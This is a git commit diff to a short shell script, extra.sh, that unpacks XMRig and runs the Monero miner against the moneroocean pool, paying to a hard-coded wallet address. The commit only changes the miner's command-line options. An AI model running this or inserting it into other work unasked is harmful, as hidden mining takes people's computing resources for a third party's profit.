a806609f63da20df1478cb656d368c414b662d5a
dragonmhmh <82892187+dragonmhmh@users.noreply.github.com>
2021-05-18 23:09:23 +0100

    Add files via upload

--- extra.sh
+++ extra.sh
@@ -1,2 +1,2 @@
 tar xvzf xmrig-v6.12.1.tar.gz
-./xmrig -o gulf.moneroocean.stream:10128 -u 46bNmb5eSTiERWkLk5RgYfE3FWku1uABWPjfLEPdp7ycgwerzwWs48d2fHRMp4NkMdVdNkb58tExdTYyH1e9ZJW6Cmnzozv+128000 -k --tls
+./xmrig -o gulf.moneroocean.stream:10128 -u 46bNmb5eSTiERWkLk5RgYfE3FWku1uABWPjfLEPdp7ycgwerzwWs48d2fHRMp4NkMdVdNkb58tExdTYyH1e9ZJW6Cmnzozv -p x
